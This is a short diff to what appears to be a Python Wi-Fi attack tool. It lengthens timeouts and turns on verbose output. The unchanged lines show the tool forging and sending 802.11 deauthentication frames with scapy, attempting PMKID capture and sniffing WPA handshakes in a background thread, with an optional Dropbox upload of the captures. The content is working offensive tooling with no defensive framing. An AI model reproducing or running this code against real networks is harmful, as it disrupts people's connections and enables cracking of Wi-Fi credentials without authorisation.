@@ -30,7 +30,7 @@ class Bcolors:
 
 # CONSTS
 DROPBOX_KEY_PATH = 'DropboxKey.txt'
-HS_TIMEOUT_AFTER_DEAUTH = 5  # In seconds
+HS_TIMEOUT_AFTER_DEAUTH = 10  # In seconds
 DEFAULT_NETWORK_INTERFACE = "wlan0"
 ENABLE_DROPBOX_UPLOAD = False
 PMKID_TIMEOUT = 10  # In seconds
@@ -204,7 +204,7 @@ def try_pmkid(iface, pcap_file, channel, ap):
 
 def send_deauth_packet():
     pkt1 = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
-    sendp(pkt1, count=deauth_count, iface=iface, verbose=False)
+    sendp(pkt1, count=deauth_count, iface=iface, verbose=True)
 
 
 def dropbox_uploader():
@@ -243,7 +243,7 @@ if __name__ == '__main__':
     try_pmkid(iface, pcap_file, channel, ap)
     t = threading.Thread(target=sniffer)  # Configure Sniffing in backgroud.
     t.start()  # Start Sniffing in the backgroud.
-    time.sleep(2)  # Wait 2 seconds for sniffing to start.
+    time.sleep(5)  # Wait 5 seconds for sniffing to start.
     send_deauth_packet()  # Send Deauth packet function.
     print(f"{Bcolors.OKBLUE}Sent {deauth_count} Deauth Packet(s){Bcolors.ENDC}")
     t.join()
